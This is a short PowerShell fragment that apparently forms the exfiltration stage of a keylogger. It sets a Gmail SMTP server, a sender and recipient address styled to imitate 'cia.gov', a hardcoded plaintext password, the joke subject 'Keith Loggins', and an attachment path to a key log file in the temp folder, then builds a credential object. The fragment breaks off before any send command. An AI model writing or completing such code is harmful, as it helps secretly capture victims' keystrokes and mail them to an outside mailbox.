$EmFrom = "email.cia.gov@gmail.com"    
$username = "email.cia.gov@gmail.com"    
$pwd = "BrainPower0!"    
$EmTo = "email.cia.gov@gmail.com"    
$Server = "smtp.gmail.com"    
$port = 587    
$Subj = "Keith Loggins"    
$Bod = "Ergo"    
$Att = "env:temp\key.txt"    
$securepwd = ConvertTo-SecureString $pwd -AsPlainText -Force    
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, $securepwd    
